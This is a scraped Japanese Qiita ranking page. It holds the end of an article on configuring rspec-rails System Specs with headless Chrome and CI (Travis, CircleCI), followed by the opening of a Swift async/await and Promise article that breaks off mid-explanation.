<p>ヘッドレスモード（画面を起動しないモード）でChromeを実行する場合は、<code>rails_helper.rb</code>に次の設定を追加します。</p>

<div class="code-frame" data-lang="rb">
<div class="code-lang"><span class="bold">spec/rails_helper.rb</span></div>
<div class="highlight"><pre><span></span><span class="no">RSpec</span><span class="o">.</span><span class="n">configure</span> <span class="k">do</span> <span class="o">|</span><span class="n">config</span><span class="o">|</span>
  <span class="c1"># ...</span>

  <span class="n">config</span><span class="o">.</span><span class="n">before</span><span class="p">(</span><span class="ss">:each</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">example</span><span class="o">|</span>
    <span class="k">if</span> <span class="n">example</span><span class="o">.</span><span class="n">metadata</span><span class="o">[</span><span class="ss">:type</span><span class="o">]</span> <span class="o">==</span> <span class="ss">:system</span>
      <span class="n">caps</span> <span class="o">=</span> <span class="no">Selenium</span><span class="o">::</span><span class="no">WebDriver</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Capabilities</span><span class="o">.</span><span class="n">chrome</span><span class="p">(</span><span class="s2">"chromeOptions"</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="s2">"args"</span> <span class="o">=&gt;</span> <span class="sx">%w(--headless --disable-gpu)</span><span class="p">})</span>
      <span class="n">driven_by</span> <span class="ss">:selenium</span><span class="p">,</span> <span class="ss">using</span><span class="p">:</span> <span class="ss">:chrome</span><span class="p">,</span> <span class="ss">screen_size</span><span class="p">:</span> <span class="o">[</span><span class="mi">1400</span><span class="p">,</span> <span class="mi">1400</span><span class="o">]</span><span class="p">,</span> <span class="ss">options</span><span class="p">:</span> <span class="p">{</span> <span class="ss">desired_capabilities</span><span class="p">:</span> <span class="n">caps</span> <span class="p">}</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></div>
</div>

<p><strong>2017.10.29 追記: 上の設定をもっとシンプルに書く</strong></p>

<p><a href="https://medium.com/table-xi/a-quick-guide-to-rails-system-tests-in-rspec-b6e9e8a8b5f6" rel="nofollow noopener" target="_blank">こちらのブログ</a>を参考にしたら、次のように簡単に書くことができました。</p>

<div class="code-frame" data-lang="rb">
<div class="code-lang"><span class="bold">spec/rails_helper.rb</span></div>
<div class="highlight"><pre><span></span><span class="no">RSpec</span><span class="o">.</span><span class="n">configure</span> <span class="k">do</span> <span class="o">|</span><span class="n">config</span><span class="o">|</span>
  <span class="c1"># ...</span>

  <span class="n">config</span><span class="o">.</span><span class="n">before</span><span class="p">(</span><span class="ss">:each</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">example</span><span class="o">|</span>
    <span class="k">if</span> <span class="n">example</span><span class="o">.</span><span class="n">metadata</span><span class="o">[</span><span class="ss">:type</span><span class="o">]</span> <span class="o">==</span> <span class="ss">:system</span>
      <span class="n">driven_by</span> <span class="ss">:selenium_chrome_headless</span><span class="p">,</span> <span class="ss">screen_size</span><span class="p">:</span> <span class="o">[</span><span class="mi">1400</span><span class="p">,</span> <span class="mi">1400</span><span class="o">]</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></div>
</div>

<h3>
<span id="js-trueのときだけchromeを起動する" class="fragment"></span><a href="#js-true%E3%81%AE%E3%81%A8%E3%81%8D%E3%81%A0%E3%81%91chrome%E3%82%92%E8%B5%B7%E5%8B%95%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>js: trueのときだけ、Chromeを起動する</h3>

<p>System Specは毎回Chromeが起動しますが、JavaScriptがなくても実行可能なテストであれば、Chromeなしで検証した方が速度面で有利です。<br>
<code>rails_helper.rb</code>に次のような設定を書けば、Feature Specのときと同じように、<code>js: true</code>のタグが付いているときだけChromeが起動するようになります。</p>

<div class="code-frame" data-lang="rb">
<div class="code-lang"><span class="bold">spec/rails_helper.rb</span></div>
<div class="highlight"><pre><span></span><span class="no">RSpec</span><span class="o">.</span><span class="n">configure</span> <span class="k">do</span> <span class="o">|</span><span class="n">config</span><span class="o">|</span>
  <span class="c1"># ...</span>

  <span class="n">config</span><span class="o">.</span><span class="n">before</span><span class="p">(</span><span class="ss">:each</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">example</span><span class="o">|</span>
    <span class="k">if</span> <span class="n">example</span><span class="o">.</span><span class="n">metadata</span><span class="o">[</span><span class="ss">:type</span><span class="o">]</span> <span class="o">==</span> <span class="ss">:system</span>
      <span class="k">if</span> <span class="n">example</span><span class="o">.</span><span class="n">metadata</span><span class="o">[</span><span class="ss">:js</span><span class="o">]</span>
        <span class="n">driven_by</span> <span class="ss">:selenium_chrome_headless</span><span class="p">,</span> <span class="ss">screen_size</span><span class="p">:</span> <span class="o">[</span><span class="mi">1400</span><span class="p">,</span> <span class="mi">1400</span><span class="o">]</span>
      <span class="k">else</span>
        <span class="n">driven_by</span> <span class="ss">:rack_test</span>
      <span class="k">end</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></div>
</div>

<p>System SpecにもJSを使う必要があるテストにだけ、<code>js: true</code>のタグを付けます。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="nb">require</span> <span class="s1">'rails_helper'</span>

<span class="no">RSpec</span><span class="o">.</span><span class="n">describe</span> <span class="s1">'Users'</span><span class="p">,</span> <span class="ss">type</span><span class="p">:</span> <span class="ss">:system</span> <span class="k">do</span>
  <span class="c1"># ...</span>

  <span class="n">it</span> <span class="s1">'completes yubinbango automatically with JS'</span><span class="p">,</span> <span class="ss">js</span><span class="p">:</span> <span class="kp">true</span> <span class="k">do</span>
    <span class="c1"># JSを使う必要があるテストを書く</span>
  <span class="k">end</span>

  <span class="n">it</span> <span class="s1">'does not complete yubinbango automatically without JS'</span> <span class="k">do</span>
    <span class="c1"># JSを使わずに済むテストを書く</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></div></div>

<h3>
<span id="テスト失敗時のスクリーンショットを確認する" class="fragment"></span><a href="#%E3%83%86%E3%82%B9%E3%83%88%E5%A4%B1%E6%95%97%E6%99%82%E3%81%AE%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>テスト失敗時のスクリーンショットを確認する</h3>

<p>テストが途中で失敗した場合は、tmp/screenshotsディレクトリにスクリーンショットが保存されます。</p>

<p><a href="https://camo.qiitausercontent.com/72bb13f4b7ebb308221fa7a331640a3d5b632fa7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373436352f30383033616261622d353965312d653532322d363333322d3438643832356538373235332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/72bb13f4b7ebb308221fa7a331640a3d5b632fa7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373436352f30383033616261622d353965312d653532322d363333322d3438643832356538373235332e706e67" alt="Screen Shot 2017-10-24 at 7.02.15.png" title="Screen Shot 2017-10-24 at 7.02.15.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/7465/0803abab-59e1-e522-6332-48d825e87253.png"></a></p>

<h3>
<span id="ciでsystem-specを実行する" class="fragment"></span><a href="#ci%E3%81%A7system-spec%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>CIでSystem Specを実行する</h3>

<p>参考までにTravis CIとCircleCIでSystem Specを実行する場合の設定例を載せておきます。</p>

<p>いずれも「Chromeはヘッドレスモードで起動」「ChromeDriverはchromedriver-helperでインストール」する場合の設定です。<br>
必要なのは最新版のChromeをインストールすることだけですね。</p>

<div class="code-frame" data-lang="yml">
<div class="code-lang"><span class="bold">.travis.yml</span></div>
<div class="highlight"><pre><span></span>sudo: required
dist: trusty
language: ruby
rvm:
  - 2.4.2
cache: bundler
bundler_args: --without production --deployment

before_install:
  - gem install bundler --pre

  # Install latest Chrome
  - sudo apt-get update
  - sudo apt-get install -y libappindicator1 fonts-liberation
  - export CHROME_BIN=/usr/bin/google-chrome
  - wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
  - sudo dpkg -i google-chrome*.deb
script:
  - bundle exec rspec spec
</pre></div>
</div>

<div class="code-frame" data-lang="yml">
<div class="code-lang"><span class="bold">circle.yml</span></div>
<div class="highlight"><pre><span></span>general:
  artifacts:
    - "tmp/capybara"
machine:
  timezone:
    Asia/Tokyo
  ruby:
    version:
      2.4.2
test:
  override:
    - bundle exec rspec spec
dependencies:
  pre:
    # Install latest Chrome
    - sudo apt-get update
    - sudo apt-get install -y libappindicator1 fonts-liberation
    - export CHROME_BIN=/usr/bin/google-chrome
    - wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
    - sudo dpkg -i google-chrome*.deb
</pre></div>
</div>

<p>こちらはCircleCI 2.0用の設定例です。</p>

<div class="code-frame" data-lang="yaml">
<div class="code-lang"><span class="bold">.circleci/config.yml</span></div>
<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">version</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">2</span>
<span class="l l-Scalar l-Scalar-Plain">jobs</span><span class="p p-Indicator">:</span>
  <span class="l l-Scalar l-Scalar-Plain">build</span><span class="p p-Indicator">:</span>
    <span class="l l-Scalar l-Scalar-Plain">docker</span><span class="p p-Indicator">:</span>
      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">image</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">circleci/ruby:2.4.2-node-browsers</span>
    <span class="l l-Scalar l-Scalar-Plain">working_directory</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">~/rails-5-1-sandbox</span>
    <span class="l l-Scalar l-Scalar-Plain">steps</span><span class="p p-Indicator">:</span>
      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">checkout</span>
      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">run</span><span class="p p-Indicator">:</span>
          <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Install System Dependencies</span>
          <span class="l l-Scalar l-Scalar-Plain">command</span><span class="p p-Indicator">:</span> <span class="p p-Indicator">|</span>
            <span class="no">sudo apt-get update</span>
            <span class="no">sudo apt-get install -y libappindicator1 fonts-liberation</span>
            <span class="no">export CHROME_BIN=/usr/bin/google-chrome</span>
            <span class="no">wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</span>
            <span class="no">sudo dpkg -i google-chrome*.deb</span>

      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">restore_cache</span><span class="p p-Indicator">:</span>
          <span class="l l-Scalar l-Scalar-Plain">keys</span><span class="p p-Indicator">:</span>
            <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">v1-dependencies-{{ checksum "Gemfile.lock" }}</span>
            <span class="c1"># fallback to using the latest cache if no exact match is found</span>
            <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">v1-dependencies-</span>
      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">run</span><span class="p p-Indicator">:</span>
          <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Bundle Install</span>
          <span class="l l-Scalar l-Scalar-Plain">command</span><span class="p p-Indicator">:</span> <span class="p p-Indicator">|</span>
            <span class="no">bundle install --jobs=4 --retry=3 --path vendor/bundle</span>
      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">save_cache</span><span class="p p-Indicator">:</span>
          <span class="l l-Scalar l-Scalar-Plain">paths</span><span class="p p-Indicator">:</span>
            <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">vendor/bundle</span>
          <span class="l l-Scalar l-Scalar-Plain">key</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">v1-dependencies-{{ checksum "Gemfile.lock" }}</span>

      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">run</span><span class="p p-Indicator">:</span>
          <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Create DB</span>
          <span class="l l-Scalar l-Scalar-Plain">command</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">bundle exec rake db:create db:schema:load --trace</span>
      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">run</span><span class="p p-Indicator">:</span>
          <span class="l l-Scalar l-Scalar-Plain">name</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">Run Tests</span>
          <span class="l l-Scalar l-Scalar-Plain">command</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">RAILS_ENV=test bundle exec rspec</span>
      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">store_test_results</span><span class="p p-Indicator">:</span>
          <span class="l l-Scalar l-Scalar-Plain">path</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">/tmp/test-results</span>
</pre></div>
</div>

<p>CircleCI 2.0の設定例についてはこちらのブログも参考になると思います。</p>

<ul>
<li><a href="https://medium.com/table-xi/a-quick-guide-to-rails-system-tests-in-rspec-b6e9e8a8b5f6" rel="nofollow noopener" target="_blank">A Quick Guide to Rails System Tests in RSpec – Table XI – Medium</a></li>
</ul>

<h2>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h2>

<p>というわけで、この記事ではrspec-rails 3.7で導入されたSystem Specの使い方を説明しました。</p>

<p>従来のFeature Specと一緒と言えば一緒なんですが、System SpecはRailsが標準で用意してくれているSystemTestCaseをラップしてくれているので、そのぶん手軽に導入でき、なおかつスクリーンショットの自動撮影のような便利な機能も使えるようになっています。</p>

<p>僕自身はまだ本格的には使い込んでいないものの、これなら今後は全部System Specに置き換えていっても大丈夫そうだなと感じています。</p>

<p>みなさんもぜひrspec-rails 3.7のSystem Specを試してみてください！</p>

<h3>
<span id="あわせて読みたい" class="fragment"></span><a href="#%E3%81%82%E3%82%8F%E3%81%9B%E3%81%A6%E8%AA%AD%E3%81%BF%E3%81%9F%E3%81%84"><i class="fa fa-link"></i></a>あわせて読みたい</h3>

<p>System Specでもブラウザの実行や画面要素の検証ではCapybaraを使います。<br>
Capybaraの詳しい使い方についてはこちらの記事が参考になると思います。</p>

<ul>
<li><a href="https://qiita.com/jnchito/items/607f956263c38a5fec24" id="reference-dd02bb2e359cf682f4e8">使えるRSpec入門・その4「どんなブラウザ操作も自由自在！逆引きCapybara大辞典」 - Qiita</a></li>
</ul>

<p>「そもそもRSpecがよくわかってないんだけど・・・」という方は、こちらの入門記事をご覧ください。</p>

<ul>
<li><a href="https://qiita.com/jnchito/items/42193d066bd61c740612" id="reference-e792b04c14958d283655">使えるRSpec入門・その1「RSpecの基本的な構文や便利な機能を理解する」 - Qiita</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">91位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>99</kbd>
		<a target="_blank" href="https://qiita.com/koher/items/29357b5e00aec1962601">Proposalには載っていないSwift 5のasync/awaitが素晴らしいと思う理論的背景</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-24<br />09:09:49</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/47085.html">koher</a>(62件の記事)<br />(Qoncept, Inc. 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/47085/profile-images/1473690868">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Swift]</b> <b>[swtws]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>2ヶ月ほど前、 Chris Lattner から swift-evolution に <a href="https://lists.swift.org/pipermail/swift-evolution/Week-of-Mon-20170814/038892.html" rel="nofollow noopener" target="_blank">"async/await + actors"</a> というタイトルで驚きのメールが流れました。</p>

<p><a href="https://camo.qiitausercontent.com/922b6cd4fa845d6c78ee625afc441ec7f9a9f48d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34373038352f63333361306133362d333064322d343264362d656237382d6331646136656465323762322e706e67" target="_blank" rel="nofollow noopener"><img width="1087" alt="async-await-actors.png" src="https://camo.qiitausercontent.com/922b6cd4fa845d6c78ee625afc441ec7f9a9f48d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34373038352f63333361306133362d333064322d343264362d656237382d6331646136656465323762322e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/47085/c33a0a36-30d2-42d6-eb78-c1da6ede27b2.png"></a></p>

<p>これは Swift における並行処理関連の提案で、主に <code>async/await</code> と <code>actor</code> についてのものです。本投稿では、そのうち <code>async/await</code> に着目します。 <code>async/await</code> といえば C# や JavaScript が思い浮かびますが、 Swift の <code>async/await</code> は Swift にフィットするように独自の変更が加えられています。</p>

<blockquote class="twitter-tweet">
<p>understanding async/await in 7 seconds <a href="https://t.co/IJOQJ2DR35" rel="nofollow noopener" target="_blank">pic.twitter.com/IJOQJ2DR35</a></p>— Wassim Chegham シ (@manekinekko) <a href="https://twitter.com/manekinekko/status/855824609299636230?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">April 22, 2017</a>
</blockquote>

<p>（ JavaScript の <code>Promise</code> と <code>async/await</code> ）</p>

<p>まだ正式な Proposal になっていませんが、<a href="https://gist.github.com/lattner/429b9070918248274f25b714dcfc7619" rel="nofollow noopener" target="_blank">こちら</a> から Proposal 全文を閲覧できます。これを読めば Swift の <code>async/await</code> がどのようなもので、何のために提案されているのかがわかります。この Proposal は平易な英語で書かれていて読みやすいので、是非一読をオススメします。 Proposal に書かれていることをそのまま書いてもおもしろくないので、 <strong>この投稿では Proposal では詳しく述べられていない背景思想について説明します</strong>。とはいえ、予備知識がなくても、基本的な Swift の構文さえ知っていれば <code>async/await</code> について一通り理解できるように説明するので安心して下さい。</p>

<p>実は、僕はこの Proposal の <code>async/await</code> とほぼ同じ内容のものを提案しようと考えていました。 GW 頃にまとめ、 <a href="https://twitter.com/rayfix" rel="nofollow noopener" target="_blank">Ray Fix さん</a>に<a href="https://gist.github.com/koher/3e04b4f1b8adbbf0379d38c0ad83a3ea/revisions#diff-74461ad55c78f93ada5df9d114aa66b4" rel="nofollow noopener" target="_blank">英文のネイティブチェック</a>をしてもらったものが<a href="https://gist.github.com/koher/3e04b4f1b8adbbf0379d38c0ad83a3ea" rel="nofollow noopener" target="_blank">こちら</a>です。ただ、当時すでに Swift 4 のまとめの時期に入っており新機能を提案できる感じではありませんでした。 Swift 5 の議論が始まったら投稿しようと思ってそのまま寝かしていました。そして、 8 月にようやく Swift 5 の議論が始まったのでそろそろ投稿しようかと思ってたところに冒頭の <a href="https://twitter.com/clattner_llvm?lang=en" rel="nofollow noopener" target="_blank">Chris Lattner</a> のメールが投稿されました。中身を確認してみると自分が考えていたのとほぼ同じ内容だったのでびっくりというわけです。</p>

<p><a href="https://camo.qiitausercontent.com/94c307ae780dd0af7baa0300033fa34065f72bb8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34373038352f62633139613936312d633963372d353062382d343330302d6435303165316632346638322e706e67" target="_blank" rel="nofollow noopener"><img width="1537" alt="native-check.png" src="https://camo.qiitausercontent.com/94c307ae780dd0af7baa0300033fa34065f72bb8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34373038352f62633139613936312d633963372d353062382d343330302d6435303165316632346638322e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/47085/bc19a961-c9c7-50b8-4300-d501e1f24f82.png"></a></p>

<p>（原型をとどめないネイティブチェックの図）</p>

<p>しかし、 Proposal の説明は自体はとてもわかりやすいのですが、その説明は僕がほぼ同じ <code>async/await</code> に思い至った経緯とはずいぶん異なっていました。この投稿では、僕がそのような <code>async/await</code> に至った過程を説明することで、なぜこの <code>async/await</code> が Swift に良くフィットするのかを説明します。</p>

<h2>
<span id="コールバック地獄" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%AB%E3%83%90%E3%83%83%E3%82%AF%E5%9C%B0%E7%8D%84"><i class="fa fa-link"></i></a>コールバック地獄</h2>

<p>Swift の非同期処理にはコールバックが用いられることが多いです。 <code>Delegate</code> もありますが、 Obj-C 由来なのでここでは触れません。</p>

<p>コールバックの問題としてよく知られるものに <strong>コールバック地獄</strong> があります。↓のように、複数の非同期処理を連ねるとピラミッド状のネストが生まれてしまいます。可読性もメンテナンス性も良くありません。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">func</span> <span class="nf">downloadFooImage</span><span class="p">(</span><span class="n">callback</span><span class="p">:</span> <span class="p">@</span><span class="n">escaping</span> <span class="p">(</span><span class="n">Image</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="p">())</span> <span class="p">{</span>
  <span class="n">downloadServerURL</span><span class="p">()</span> <span class="p">{</span> <span class="n">url</span> <span class="k">in</span>
    <span class="n">downloadJSON</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span> <span class="p">{</span> <span class="n">json</span> <span class="k">in</span>
      <span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">json</span><span class="p">[</span><span class="s">"foo"</span><span class="p">][</span><span class="s">"image"</span><span class="p">][</span><span class="s">"url"</span><span class="p">].</span><span class="n">string</span><span class="p">!</span> <span class="p">)</span> <span class="p">{</span> <span class="n">imageData</span> <span class="k">in</span>
        <span class="n">callback</span><span class="p">(</span><span class="n">Image</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="n">imageData</span><span class="p">)</span><span class="o">!</span><span class="p">)</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="promise" class="fragment"></span><a href="#promise"><i class="fa fa-link"></i></a><code>Promise</code>
</h2>

<p>コールバック地獄の対策の一つとして、 JavaScript で有名になった <code>Promise</code> があります。</p>

<p><code>Promise&lt;Foo&gt;</code> は今はまだ手に入っていないけど、将来のいつか手に入る <code>Foo</code> 型の値を意味します。たとえば、 <code>url</code> を渡して <code>Data</code> をダウンロードする関数 <code>download</code> を考えてみます。コールバック版と <code>Promise</code> 版のシグネチャはそれぞれ次のようになります。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// コールバック</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">,</span> <span class="n">completion</span><span class="p">:</span> <span class="p">@</span><span class="n">escaping</span> <span class="p">(</span><span class="n">Data</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="p">())</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>

<span class="c1">// Promise</span>
<span class="kd">func</span> <span class="nf">download</span><span class="p">(</span><span class="n">from</span> <span class="n">url</span><span class="p">:</span> <span class="n">URL</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="n">Data</span><span class="p">&gt;</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
</pre></div></div>

<p><code>Promise&lt;Data&gt;</code> を将来のいつか手に入る <code>Data</code> 型の値と読めれば、 <code>url</code> を渡して <code>Promise&lt;Data&gt;</code> を返してくれる後者の方が（少なくとも僕は）わかりやすいと思います。</p>

<p>では、 <code>Promise</code> を使ってどのようにコールバック地獄を解消するのでしょうか？そのためにはもう少し <code>Promise</code> について説明しなければなりません。</p>

<h3>
<span id="promisek" class="fragment"></span><a href="#promisek"><i class="fa fa-link"></i></a>PromiseK</h3>

<p>僕の勤務先である Qoncept では、 Swift 1.0 のリリースと同時に Swift を使い始めたんですが、 2014 年の年末頃にはコールバック地獄の問題が顕在化していました。そんなときに、僕の同僚の <a href="/omochimetaru" class="user-mention js-hovercard" title="omochimetaru" data-hovercard-target-type="user" data-hovercard-target-name="omochimetaru">@omochimetaru</a> が「 Swift にも JavaScript の <code>Promise</code> がほしい。」と言って Swift で再現したものをサクッと実装し、使い始めました。</p>

<p>僕はそのとき初めて <code>Promise</code> を知ったんですが、使ってみてなかなかいいなと思いました。しかし、使っている内に僕はいくつかの不満を抱き始めました。</p>

<p>たとえば、 Swift 1.0 の頃には <code>Optional</code> の <code>nil</code> でエラーを表すことが一般的でした。しかし、 JavaScript の <code>Promise</code> は非同期だけでなくエラーも扱っていました。非同期処理はエラー処理を伴うことが多いとはいえ、本質的には二つは直交した概念です。 Swift にはせっかく <code>Optional</code> があるのに、 <code>Promise</code> を使うときは <code>Promise</code> でエラー処理をするというのが気に入りませんでした。</p>

<p>そこで、 JavaScript の <code>Promise</code> からエラー処理に関する機能を取り除いて非同期処理に特化した <code>Promise</code> ライブラリ <a href="https://github.com/koher/PromiseK" rel="nofollow noopener" target="_blank">PromiseK</a> を作りました。 PromiseK の <code>Promise</code> は純粋に非同期であることだけを表します。エラーが起こり得ることは <code>Promise&lt;Optional&lt;Foo&gt;&gt;</code> のように <code>Optional</code> 等と組み合わせて表現します。</p>

<p>提案されている <code>async/await</code> と、このエラー処理を取り除いた <code>Promise</code> は強く関連しているので、 PromiseK をベースに <code>Promise</code> について説明します。</p>

<h3>
<span id="結果のハンドリング" class="fragment"></span><a href="#%E7%B5%90%E6%9E%9C%E3%81%AE%E3%83%8F%E3%83%B3%E3%83%89%E3%83%AA%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a>結果のハンドリング</h3>

<p>コールバックだろうが <code>Promise</code> だろうが、非同期処理の結果を受け取ってハンドリングすることは必須です。先程の <code>download</code> 関数を利用するコードはそれぞれ次のようになります。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// コールバック</span>
<span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span> <span class="p">{</span> <span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="n">Data</span><span class="p">)</span> <span class="k">in</span> <span class="c1">// 非同期処理完了時に実行</span>
  <span class="c1">// `data` を使う処理</span>
<span class="p">}</span>

<span class="c1">// Promise</span>
<span class="kd">let</span> <span class="nv">data</span><span class="p">:</span> <span class="n">Promise</span><span class="p">&lt;</span><span class="n">Data</span><span class="p">&gt;</span> <span class="p">=</span> <span class="n">download</span><span class="p">(</span><span class="n">from</span><span class="p">:</span> <span class="n">url</span><span class="p">)</span>
<span class="n">data</span><span class="p">.</span><span class="kr">get</span> <span class="p">{</span> <span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="n">Data</span><span class="p">)</span> <span class="k">in</span> <span class="c1">// 非同期処理完了時に実行</span>
  <span class="c1">// `data` を使う処理</span>
<span class="p">}</span>
</pre></div></div>

<p>このコードを見ただけでは、 <code>Promise</code> を使って何がうれしいのかわからないと思います。重要なのは、 <code>Promise</code> 版の場合は結果が値として返されるということです。 <code>Promise&lt;Data&gt;</code> という形で非同期処理そのものが値として返されるので、それを取り回して複数の非同期処理を結合して順番に実行したり、並列に走らせてから最後に結合したりという操作が可能になります。</p>

<p>具体的には後で詳しく説明しますが、そのように複数の非同期処理に対して結合などの操作を実行できることがコールバック地獄のネストを取り除くことを可能にします。なので、先程のコードのように単発で非同期処理の結果を受け取るだけでは <code>Promise</code> のうまみがわかりませんが、値として取り回せるということが重要なポイントです。</p>

<h3>
<span id="map" class="fragment"></span><a href="#map"><i class="fa fa-link"></i></a><code>map</code>
</h3>

<p>では、どのように非同期処理を操作するのでしょう？ JavaScript の <code>Promise</code> では <code>then</code> メソッド <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then" class="autolink" rel="nofollow noopener" target="_blank">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then</a> が肝となります。しかし、　<strong>僕が JavaScript の <code>Promise</code> について気に入らなかったもう一つの点がその <code>then</code> メソッドでした</strong>。</p>

<p>当時モナドについて知りたいと思って <a href="https://www.amazon.co.jp/dp/B009RO80XY" rel="nofollow noopener" target="_blank">"すごいHaskell"</a> を読んでいた僕は、 <code>Promise</code> はモナドで <code>then</code> メソッドは <code>map</code> と <code>flatMap</code> をごちゃ混ぜにしたものだと気付きました。モナドというのは、　<code>Array</code> や <code>Optional</code> のように <code>map</code> と <code>flatMap</code> を持っている型のことです。そこで、僕は PromiseK を実装するに当たって <code>then</code> メソッドを廃止し、 <code>map</code> メソッドと <code>flatMap</code> メソッドに分解することにしました。</p>

<p><code>map</code> メソッドは Swift を書いていると馴染み深いんじゃないかと思います。たとえば、 <code>Array&lt;Int&gt;</code> ( <code>[Int]</code> )の各要素を 2 乗するコードは次のように書けます。</p>

